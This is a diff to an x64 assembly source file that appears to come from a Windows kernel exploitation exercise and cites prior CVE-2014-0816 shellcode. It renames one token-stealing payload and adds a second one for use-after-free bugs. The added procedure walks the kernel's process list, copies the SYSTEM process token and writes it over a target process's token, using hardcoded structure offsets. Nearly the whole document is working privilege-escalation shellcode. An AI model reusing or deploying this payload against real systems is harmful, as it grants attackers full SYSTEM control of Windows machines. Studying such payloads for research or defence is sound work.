@@ -80,7 +80,7 @@ ENDM
 
 ; https://github.com/tandasat/CVE-2014-0816/blob/master/exploit_ngs/exploit_ngs/shellcode.asm
 
-TokenStealingPayloadWin10 PROC
+TokenStealingPayloadStackOverflow PROC
 	;db 0cch ; --- breakpoint for debug
 	pushfq
 	PUSHAQ	; Save registers state
@@ -156,8 +156,74 @@ TokenStealingPayloadWin10 PROC
 	add     rsp, 38h ; Restore stack state
 	ret
 
-TokenStealingPayloadWin10 ENDP
+TokenStealingPayloadStackOverflow ENDP
 
+ 
+
+TokenStealingPayloadUAF PROC
+	;db 0cch ; --- breakpoint for debug
+	pushfq
+	PUSHAQ	; Save registers state
+
+	
+
+	mov RDX, qword ptr gs:[188h]
+	; dt nt!_KTHREAD @RDX
+	;mov rdx, [gs:188h] ; KTHREAD pointer (// 0x188 = nt!_KPCR.PcrbData.CurrentThread)
+	; RDX = (_KTHREAD*) nt!_KPCR.PcrbData.CurrentThread 
+
+	mov r8, [RDX + 0B8h] ; EPROCESS pointer (nt!_KTHREAD.ApcState.Process)
+	; dt nt!_EPROCESS @R8
+	; R8 = (_KPROCESS*) nt!_KTHREAD.ApcState.Process
+
+	mov r9, [r8 + 2E8h] ; ActiveProcessLinks list head
+	; dt nt!_LIST_ENTRY @R9
+	; R9 = (_LIST_ENTRY) nt!_EPROCESS.ActiveProcessLinks 
+
+	mov RCX, [r9] ; follow link to first process in list
+	; dt nt!_LIST_ENTRY @RCX
+	;RCX = ActiveProcessLinks.Flink
+
+	find_system:
+		mov RDX, [RCX-8] ; ActiveProcessLinks - 8 = UniqueProcessId
+		cmp RDX, 4 ;UniqueProcessId == 4?
+		jz found_system ;YES - move on
+		mov RCX, [RCX] ;NO - load next entry in list
+		jmp find_system ; loop
+	
+	found_system:
+		; RCX = nt!_EPROCESS.ActiveProcessLinks (offset = +0x2f0)
+		; nt!_EPROCESS.token (offset = +0x358)
+		; 0x358 - 0x2e8  = 0x70
+		; RCX + 68h = nt!_EPROCESS.token
+		mov RAX, [RCX + 70h] ;offset to token (+0x358)
+		; RAX = content of nt!_EX_FAST_REF
+
+		and al, 0f0h ;clear low 4 bits of _EX_FAST_REF structure
+
+	find_cmd:
+		mov RDX, [RCX-8] ;ActiveProcessLinks - 8 = UniqueProcessId
+		
+		cmp RDX, 0DDAABBEEh ; universal
+
+		;cmp RDX, 1644h; cmd.exe dec 5700 for testing via VMWare with Snapshot
+		
+
+		jz found_cmd ;YES - move on
+		mov RCX, [RCX] ;NO - next entry in list
+		jmp find_cmd ;loop
+	
+	found_cmd:
+		mov [RCX + 70h], rax ;copy SYSTEM token over top of this process's token
+	
+	return:  ; Kernel Recovery Stub
+	
+	POPAQ
+	popfq ; Restore registers state
+
+	ret ;; // No Need of Kernel Recovery as we are not corrupting anything
+
+TokenStealingPayloadUAF ENDP
 
 PURGE PUSHAQ
 PURGE POPAQ
